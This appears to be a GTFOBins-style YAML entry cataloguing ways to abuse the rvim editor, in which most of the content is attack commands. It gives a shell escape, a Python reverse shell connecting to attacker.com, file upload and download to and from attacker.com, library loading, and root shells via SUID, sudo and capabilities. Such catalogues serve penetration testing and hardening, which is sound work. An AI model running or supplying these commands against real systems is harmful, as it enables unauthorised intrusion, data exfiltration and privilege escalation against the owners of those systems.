---
functions:
  shell:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  reverse-shell:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        pty.spawn("/bin/sh")
        vim.command(":q!")'
  file-upload:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        rvim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
        vim.command(":q!")'
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        rvim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
        vim.command(":q!")'
  file-download:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        rvim -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["URL"], e["LFILE"])
        vim.command(":q!")'
  file-write:
    - description: This requires that rvim is compiled with Python support. Prepend `:py3` for Python 3.
      code: |
        rvim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: rvim file_to_read
  library-load:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
  suid:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
  sudo:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  capabilities:
    - description: This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
---
